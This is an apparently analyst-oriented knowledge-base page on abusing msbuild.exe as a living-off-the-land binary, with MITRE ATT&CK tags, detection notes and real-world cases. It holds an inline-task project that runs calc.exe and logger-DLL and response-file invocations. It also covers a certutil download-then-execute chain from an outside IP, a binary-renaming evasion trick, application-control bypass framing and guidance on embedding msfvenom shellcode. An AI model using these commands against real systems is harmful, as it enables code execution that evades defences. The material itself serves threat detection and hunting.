# LOLBins — msbuild.exe — Hands-On Use Cases

Every scenario below runs entirely inside the single `msbuild.exe` process documented in `01 - Overview.md` §How It Works — no compiler child process, no dropped PE payload. What changes per scenario is which of MSBuild's 5 LOLBAS-documented execution paths is used, where the payload actually lives (inline source vs. a precompiled DLL vs. project-file-embedded script), and how the technique is staged/chained with the rest of an intrusion. MITRE ATT&CK ID(s) are tagged per scenario.

## Contents
- [Baseline Inline-Task Execution via RoslynCodeTaskFactory](#baseline-inline-task-execution-via-roslyncodetaskfactory)
- [Legacy CodeTaskFactory Variant](#legacy-codetaskfactory-variant)
- [AppLocker/WDAC Bypass Framing](#applockerwdac-bypass-framing)
- [PowerShell Constrained Language Mode Bypass](#powershell-constrained-language-mode-bypass)
- [Logger DLL Execution](#logger-dll-execution)
- [XSL Transformation — JScript/VBScript Execution](#xsl-transformation--jscriptvbscript-execution)
- [Response-File Invocation to Hide the Command Line](#response-file-invocation-to-hide-the-command-line)
- [Staged Delivery via certutil](#staged-delivery-via-certutil)
- [Embedding an msfvenom-Generated Payload](#embedding-an-msfvenom-generated-payload)
- [Renamed or Relocated Binary](#renamed-or-relocated-binary)
- [Fleet-Wide C2-Tasked Execution](#fleet-wide-c2-tasked-execution)
- [Chained Execution from an Initial-Access Vector](#chained-execution-from-an-initial-access-vector)
- [Known Real-World Malicious Use](#known-real-world-malicious-use)
- [Legitimate-Baseline Contrast](#legitimate-baseline-contrast)

---

## Baseline Inline-Task Execution via RoslynCodeTaskFactory

**MITRE ATT&CK:** [T1127.001](https://attack.mitre.org/techniques/T1127/001/) (Trusted Developer Utilities Proxy Execution: MSBuild)

`evil.csproj`:
```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="RoslynCodeTaskFactory"
    AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
using System;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class ClassExample : Task, ITask
{
    public override bool Execute()
    {
        // Attacker code runs here, inside msbuild.exe
        System.Diagnostics.Process.Start("calc.exe");
        return true;
    }
}
]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```cmd
msbuild.exe evil.csproj
```

Matches LOLBAS's "AWL Bypass" (`.xml`) and "Execute" (`.csproj`) command entries — both documented as "Build and execute a C# project stored in the target [file]." `RoslynCodeTaskFactory` is the currently Microsoft-recommended factory (MSBuild 15.8+); the `AssemblyFile` path shown (`$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll`) is the exact one used in Microsoft's own official inline-task documentation. No target needs to be named on the command line — `Hello` runs automatically as MSBuild's default/first target here, so the invocation is just `msbuild.exe evil.csproj`.

## Legacy CodeTaskFactory Variant

**MITRE ATT&CK:** T1127.001

Structurally identical to the baseline case, but with `TaskFactory="CodeTaskFactory"` instead of `RoslynCodeTaskFactory`. Per Microsoft's current documentation, `CodeTaskFactory` "only supports C# versions up to 4.0" — a real functional constraint, not just a legacy label — but it remains present and usable on current Windows/.NET Framework installs. An analyst should expect to see this older factory in circulating PoC project files and less-recently-updated attacker tooling, not just `RoslynCodeTaskFactory`; a detection rule that only matches on the string `RoslynCodeTaskFactory` misses this variant entirely.

## AppLocker/WDAC Bypass Framing

**MITRE ATT&CK:** T1127.001, [T1218](https://attack.mitre.org/techniques/T1218/) (System Binary Proxy Execution, parent category context)

Operationally identical to the baseline case — the "use case" here is the *reason* an operator reaches for MSBuild specifically rather than dropping a compiled payload directly: on an estate with AppLocker or WDAC configured to allow execution only of Microsoft-signed binaries (a common, reasonable-sounding policy), `msbuild.exe` frequently passes that policy outright since it's a legitimate, signed .NET Framework component. LOLBAS itself categorizes the `.xml`-file inline-task command specifically as **"AWL Bypass"** (Application Whitelisting Bypass), distinct from its plain "Execute" categorization of the `.csproj` variant — same mechanism, but this framing is the actual reason it appears in real intrusions on hardened endpoints.

## PowerShell Constrained Language Mode Bypass

**MITRE ATT&CK:** T1127.001

Where an environment enforces PowerShell Constrained Language Mode (CLM) to block arbitrary .NET method invocation and COM object creation from PowerShell scripts, MSBuild's inline-task execution sidesteps the restriction entirely — the attacker's code runs as compiled .NET **inside `msbuild.exe`**, never touching the PowerShell engine CLM is scoped to. A PowerShell foothold that's otherwise CLM-constrained can shell out to `msbuild.exe evil.csproj` and get full-trust code execution outside PowerShell's own restricted runtime:

```powershell
Start-Process msbuild.exe -ArgumentList "evil.csproj" -Wait
```

## Logger DLL Execution

**MITRE ATT&CK:** [T1129](https://attack.mitre.org/techniques/T1129/) (Shared Modules), T1127.001

A fundamentally different technique from the inline-task cases above — no source compilation involved at all. LOLBAS documents this exact syntax:

```cmd
msbuild.exe /logger:TargetLogger,C:\Users\Public\evil.dll;MyParameters,Foo
```

MSBuild loads the specified DLL and instantiates its `TargetLogger` class to receive build-event notifications — the DLL's constructor/static-initialization code runs as a side effect of simply being loaded, meaning **the payload here is a real, precompiled DLL**, not plaintext source. This matters for detection: a hunt built around spotting `UsingTask`/`CodeTaskFactory` strings in a project file entirely misses this technique, since no project file with that content is involved — only a `/logger:` switch and a path to an arbitrary DLL.

## XSL Transformation — JScript/VBScript Execution

**MITRE ATT&CK:** [T1059.007](https://attack.mitre.org/techniques/T1059/007/) (JavaScript/JScript) or [T1059.005](https://attack.mitre.org/techniques/T1059/005/) (Visual Basic), T1127.001

LOLBAS's third distinct execution path — executing JScript or VBScript code through an XML/XSL Transformation embedded in a `.proj` file, requiring MSBuild v14.0 or later:

```cmd
msbuild.exe evil.proj
```

The scripting payload lives inside the `.proj` file's XSL-transformation content rather than a `<Code>`-element C#/VB block — a third distinct place malicious content can hide inside an otherwise unremarkable-looking project file, and a third pattern a content-inspection rule needs to separately account for beyond `UsingTask`/`CodeTaskFactory` strings.

## Response-File Invocation to Hide the Command Line

**MITRE ATT&CK:** T1127.001

LOLBAS's fifth documented command — putting valid MSBuild command-line options, including the target project file itself, inside a response file:

```cmd
msbuild.exe @evil.rsp
```

Where `evil.rsp` contains, for example, `evil.csproj -nologo -verbosity:quiet`. Since the actual project-file path and any switches live inside the `.rsp` file's contents rather than the process command line MSBuild was launched with, a Sysmon 1/Security 4688 command-line hunt only ever sees `msbuild.exe @evil.rsp` — no filename, no switches, nothing to pattern-match against beyond the bare `@`-prefixed invocation shape itself.

## Staged Delivery via certutil

**MITRE ATT&CK:** [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer), T1127.001

MSBuild has no download/fetch capability of its own — the project file must already be staged locally before any of the commands above will do anything (see `01`'s Prerequisites: no documented remote/URL-hosted project-file support). A realistic chain pulls the project file down with another LOLBIN first — this module's own `../certutil/` is the natural pairing, since it's already covered in depth there:

```cmd
certutil.exe -urlcache -f http://198.51.100.7/evil.csproj C:\Users\Public\evil.csproj
msbuild.exe C:\Users\Public\evil.csproj
```

See `../certutil/02 - Hands-On Use Cases.md`'s "Chained Download-Then-Execute One-Liner" for the same download-then-run pattern used against a different eventual payload type.

## Embedding an msfvenom-Generated Payload

**MITRE ATT&CK:** T1127.001, [T1055](https://attack.mitre.org/techniques/T1055/) (Process Injection, if the shellcode is subsequently injected rather than run in-process)

Rather than hand-writing attacker logic in the inline `<Code>` block, an operator commonly embeds shellcode generated by `msfvenom` (cross-link `../../Metasploit/msfvenom/`) as a C# byte array, then executes it in-memory from within the compiled task using standard Win32 shellcode-runner patterns (`VirtualAlloc`/`CreateThread` via P/Invoke). The inline task's compiled `Execute()` method becomes, functionally, a minimal shellcode loader — see `../../Metasploit/msfvenom/02 - Hands-On Use Cases.md` for `msfvenom`'s own raw-shellcode output-format options (`-f csharp` produces output already formatted as a C# byte array, directly pasteable into the `<Code>` block).

## Renamed or Relocated Binary

**MITRE ATT&CK:** [T1036.003](https://attack.mitre.org/techniques/T1036/003/) (Masquerading: Rename System Utilities), plus whichever execution technique it's paired with

```cmd
copy "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" C:\Users\Public\svchost_update.exe
C:\Users\Public\svchost_update.exe evil.csproj
```

Defeats any detection rule keyed purely on `Image` = `msbuild.exe` at one of the paths in `01`'s Full-Path table. Authenticode signature and the PE's own `OriginalFileName` metadata still resolve the renamed copy back to genuine Microsoft-signed `MSBuild.exe`, matching the same evasion/detection pattern already documented for `../certutil/`'s renamed-binary use case.

## Fleet-Wide C2-Tasked Execution

**MITRE ATT&CK:** T1127.001

```cmd
:: Issued identically across many already-compromised hosts via C2 tasking
msbuild.exe -nologo -verbosity:quiet C:\Windows\Temp\payload.csproj
```

MITRE ATT&CK's own procedure-example list for T1127.001 names **Empire** as shipping built-in modules specifically to automate MSBuild-based execution — meaning this isn't a hypothetical fleet-wide use case, it's a documented, tooled-for one. See `../../PowerShell Empire/03 - Source Evidence.md` for what that framework's own task-history logging captures when it tasks a technique like this across sessions.

## Chained Execution from an Initial-Access Vector

**MITRE ATT&CK:** T1127.001, [T1204.002](https://attack.mitre.org/techniques/T1204/002/) (User Execution: Malicious File) where the initial foothold was phishing-delivered

A malicious Office macro or an initial LOLBIN stage (see [`Windows/Threat Landscape and Playbooks/LOLBIN Abuse Hunting Playbook.md`](<../../../Windows/Threat Landscape and Playbooks/LOLBIN Abuse Hunting Playbook.md>)) drops the crafted project file to disk and shells out to `msbuild.exe` against it, rather than trying to smuggle a compiled payload past whatever email/web content filtering is in place — the project file is plain, unremarkable-looking XML, which travels through most content filters more easily than an `.exe` attachment.

## Known Real-World Malicious Use

**MITRE ATT&CK:** T1127.001 — cited directly from [attack.mitre.org/techniques/T1127/001](https://attack.mitre.org/techniques/T1127/001/)'s own procedure-example list, included here for threat-intel context rather than as a how-to:

- **Frankenstein campaign** — used MSBuild to execute actor-created files
- **NOOPLDR** — executable via MSBuild
- **MirrorFace / Operation AkaiRyū** — used MSBuild to compile and execute the FaceXInjector malware
- **PlugX** (a variant) — loads as shellcode within a .NET Framework project, using `msbuild.exe` specifically to bypass application control

An analyst investigating a suspected MSBuild-abuse incident should check whether the observed project-file structure or inline-code pattern resembles any of these named, previously-analyzed cases before assuming a novel technique.

## Legitimate-Baseline Contrast

Not an attack — included so an analyst can recognize the noise floor this technique has to hide in:

```cmd
msbuild.exe MySolution.sln -t:Rebuild -p:Configuration=Release -restore
msbuild.exe MyProject.csproj -v:minimal
```

A developer's own build, or a CI/build-server agent's automated build, targets a real project/solution file living inside a version-controlled source tree, uses `-p:`/`-t:` switches that correspond to an actual application configuration/target, and produces genuine compiled output under `bin\`/`obj\` — this is the baseline the isolated-project-file, no-source-tree, no-compiled-output pattern described in `01`'s Legitimate vs. Abused Usage section has to distinguish itself from.
